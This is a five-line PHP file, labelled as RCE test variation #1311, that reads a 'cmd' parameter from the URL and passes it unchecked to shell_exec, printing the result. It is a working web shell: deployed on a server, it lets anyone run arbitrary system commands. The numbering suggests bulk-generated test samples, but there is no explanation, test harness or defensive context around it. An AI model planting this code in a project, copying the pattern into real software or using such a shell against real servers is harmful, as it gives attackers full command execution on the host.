<?php
// RCE test variation #1311
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>